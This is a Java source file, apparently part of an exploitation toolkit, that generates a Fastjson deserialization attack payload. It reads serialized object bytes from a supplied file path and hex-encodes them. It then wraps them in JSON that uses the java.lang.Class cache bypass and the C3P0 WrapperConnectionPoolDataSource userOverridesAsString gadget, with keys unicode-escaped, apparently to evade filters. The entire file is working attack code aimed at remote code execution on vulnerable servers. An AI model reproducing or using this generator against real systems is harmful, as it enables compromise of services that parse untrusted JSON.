package com.droplab.Controller.FastJson.Service;

import com.droplab.Controller.FastJson.Common.C3P0SerializeObject;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;

import java.io.File;
import java.nio.file.Files;
import java.util.Iterator;

public class FastJsonC3P0Other extends BugService {
    private final String payload="{\"a\":{\"%s\":\"%s\",\"%s\":\"%s\"},\"b\":{\"%s\":\"%s\",\"%s\":\"%s\"}}";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String filepath = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("filepath")) {
                        filepath = params.get(key);
                    }
                }
                if(filepath != null){
                    File file = new File(filepath);
                    byte[] object = Files.readAllBytes(file.toPath());
                    String hexAsciiSerializedMap = C3P0SerializeObject.instance().getHexAsciiSerializedMap(object);
                    ResponseUtils responseUtils = new ResponseUtils();
                    //String payload= String.format("{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"%s\"}", hexAsciiSerializedMap);
                    String userOverridesAsString = String.format(payload,
                            CommonUtils.string2Unicode("@type"),
                            CommonUtils.string2Unicode("java.lang.Class"),
                            CommonUtils.string2Unicode("val"),
                            CommonUtils.string2Unicode("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"),
                            CommonUtils.string2Unicode("@type"),
                            CommonUtils.string2Unicode("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"),
                            CommonUtils.string2Unicode("userOverridesAsString"),
                            hexAsciiSerializedMap);
                    responseUtils.setMessage(userOverridesAsString);
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
